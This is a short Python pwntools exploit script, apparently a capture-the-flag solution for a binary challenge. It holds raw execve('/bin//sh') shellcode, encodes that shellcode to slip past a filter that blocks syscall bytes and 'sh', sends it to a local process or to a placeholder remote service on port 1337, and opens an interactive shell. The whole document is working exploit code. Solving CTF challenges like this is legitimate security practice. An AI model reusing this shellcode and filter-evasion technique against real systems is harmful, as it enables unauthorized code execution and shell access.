#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")

context.binary = exe

context.arch = 'amd64'
context.os = 'linux'

# shellcode = asm(shellcraft.amd64.linux.sh()) # This works too but i want to test a shorter shellcode
shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
encoder = pwnlib.encoders.encoder.encode(shellcode, avoid=b'\x0f\x05sh')
print(f"Assembly of shellcode:\n{disasm(encoder)}")
print(f"Encoded shellcode length: {len(encoder)}")
print(f"Encoded shellcode: {encoder}")
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    print(r.recvuntil(b"code:"))
    # gdb.attach(r, """b * main +191
    # """)
    r.sendline(encoder)
    r.sendline("ls")

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
